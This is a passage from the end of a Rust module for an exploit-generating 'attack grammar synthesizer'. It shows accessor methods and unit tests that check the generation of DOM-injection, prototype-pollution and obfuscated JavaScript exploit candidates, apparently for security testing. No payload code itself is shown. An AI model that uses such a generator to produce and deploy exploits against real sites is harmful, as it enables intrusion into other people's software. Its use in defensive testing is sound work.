                js_path.to_string_lossy().to_string(),
                manifest_path.to_string_lossy().to_string(),
            ));
        }

        Ok(written_files)
    }

    /// Access generated candidates.
    pub fn candidates(&self) -> &[ExploitCandidate] {
        &self.generated_candidates
    }

    /// Total number of exploits generated.
    pub fn generation_count(&self) -> u64 {
        self.generation_count
    }

    /// Configuration reference.
    pub fn config(&self) -> &SynthesisConfig {
        &self.config
    }
}

// ===========================================================================
// Tests
// ===========================================================================

#[cfg(test)]
mod tests {
    use super::*;

    fn test_config() -> SynthesisConfig {
        let mut strategies = BTreeSet::new();
        strategies.insert(AttackStrategy::DomInjection);
        strategies.insert(AttackStrategy::PrototypePollution);

        SynthesisConfig {
            max_candidates_per_strategy: 10,
            max_mutations_per_base: 5,
            preferred_strategies: strategies,
            severity_threshold: ExploitSeverity::Low,
            include_obfuscation: true,
            epoch: SecurityEpoch::from_raw(100),
        }
    }

    #[test]
    fn attack_strategy_display() {
        assert_eq!(AttackStrategy::DomInjection.to_string(), "dom-injection");
        assert_eq!(
            AttackStrategy::PrototypePollution.to_string(),
            "prototype-pollution"
        );
        assert_eq!(
            AttackStrategy::EventHijacking.to_string(),
            "event-hijacking"
        );
        assert_eq!(
            AttackStrategy::ResourceExhaustion.to_string(),
            "resource-exhaustion"
        );
        assert_eq!(AttackStrategy::LogicBomb.to_string(), "logic-bomb");
        assert_eq!(AttackStrategy::SupplyChain.to_string(), "supply-chain");
    }

    #[test]
    fn exploit_target_display() {
        assert_eq!(ExploitTarget::DomTree.to_string(), "dom-tree");
        assert_eq!(
            ExploitTarget::GlobalNamespace.to_string(),
            "global-namespace"
        );
        assert_eq!(ExploitTarget::EventSystem.to_string(), "event-system");
    }

    #[test]
    fn exploit_severity_display_and_millionths() {
        assert_eq!(ExploitSeverity::Low.to_string(), "low");
        assert_eq!(ExploitSeverity::Low.to_millionths(), 250_000);
        assert_eq!(ExploitSeverity::Critical.to_millionths(), 1_000_000);
    }

    #[test]
    fn mutation_operator_display() {
        assert_eq!(
            MutationOperator::PayloadEncoding.to_string(),
            "payload-encoding"
        );
        assert_eq!(MutationOperator::Obfuscation.to_string(), "obfuscation");
    }

    #[test]
    fn config_default() {
        let cfg = SynthesisConfig::default();
        assert_eq!(cfg.max_candidates_per_strategy, DEFAULT_MAX_CANDIDATES);
        assert_eq!(cfg.max_mutations_per_base, DEFAULT_MAX_MUTATIONS);
        assert!(cfg.include_obfuscation);
    }

    #[test]
    fn synthesizer_starts_empty() {
        let synth = AttackGrammarSynthesizer::new(test_config());
        assert_eq!(synth.generation_count(), 0);
        assert!(synth.candidates().is_empty());
    }

    #[test]
    fn generate_dom_injection_exploits() {
        let synth = AttackGrammarSynthesizer::new(test_config());
        let exploits = synth
            .generate_dom_injection_exploits()
            .expect("should generate DOM injection exploits");

        assert!(!exploits.is_empty());
        let exploit = &exploits[0];
        assert!(exploit.javascript_code.contains("innerHTML"));
        assert!(exploit.js_filename.ends_with(".js"));
        assert!(exploit.manifest_filename.ends_with(".manifest.json"));
    }

    #[test]
    fn generate_prototype_pollution_exploits() {
        let synth = AttackGrammarSynthesizer::new(test_config());
        let exploits = synth
            .generate_prototype_pollution_exploits()
            .expect("should generate prototype pollution exploits");

        assert!(!exploits.is_empty());
        let exploit = &exploits[0];
        assert!(exploit.javascript_code.contains("__proto__"));
        assert_eq!(exploit.manifest.severity, ExploitSeverity::Critical);
    }

    #[test]
    fn synthesize_all_strategies() {
        let mut synth = AttackGrammarSynthesizer::new(test_config());
        let candidates = synth
            .synthesize_exploits(1000)
            .expect("should synthesize exploits");

        assert!(!candidates.is_empty());
        assert_eq!(synth.generation_count(), candidates.len() as u64);
    }

    #[test]
    fn apply_payload_encoding_mutation() {
        let synth = AttackGrammarSynthesizer::new(test_config());
        let base_exploits = synth
            .generate_dom_injection_exploits()
            .expect("should generate base exploits");
        let base = &base_exploits[0];

        let mutated = synth
            .apply_mutation(base, MutationOperator::PayloadEncoding, 1000)
            .expect("should apply mutation");

        assert!(mutated.javascript_code.contains("atob"));
        assert_ne!(mutated.manifest.exploit_id, base.manifest.exploit_id);
    }

    #[test]
    fn error_display() {
        let errors = vec![
            AttackGrammarError::NoBaseExploits,
            AttackGrammarError::UnsupportedStrategy {
                strategy: AttackStrategy::DomInjection,
            },
            AttackGrammarError::CodeGeneration {
                reason: "test".to_string(),
            },
        ];

        for err in &errors {
            assert!(!err.to_string().is_empty());
        }
    }

    #[test]
    fn manifest_serde_roundtrip() {
        let synth = AttackGrammarSynthesizer::new(test_config());
        let exploits = synth
            .generate_dom_injection_exploits()
            .expect("should generate exploits");

        let manifest = &exploits[0].manifest;
        let json = serde_json::to_string(manifest).expect("should serialize");
        let restored: ExploitManifest = serde_json::from_str(&json).expect("should deserialize");

        assert_eq!(manifest.exploit_id, restored.exploit_id);
        assert_eq!(manifest.strategy, restored.strategy);
    }

    #[test]
    fn constants_values() {
        assert_eq!(DEFAULT_MAX_CANDIDATES, 50);
        assert_eq!(DEFAULT_MAX_MUTATIONS, 25);
    }
}
